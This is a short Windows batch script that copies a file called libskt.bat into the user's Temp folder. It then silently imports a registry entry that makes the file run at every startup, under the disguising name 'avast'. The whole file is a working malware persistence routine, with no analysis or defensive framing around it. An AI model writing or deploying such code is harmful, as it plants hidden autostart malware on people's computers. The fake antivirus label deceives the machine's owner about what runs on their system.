@echo off
for %%A in (%USERNAME%) do (
copy libskt.bat C:\Users\%%A\AppData\Local\Temp
echo Windows Registry Editor Version 5.00 > proba.reg

echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> proba.reg
echo "avast"="C:\Users\%%A\AppData\Local\Temp\libskt.bat" >> proba.reg
regedit /s proba.reg
)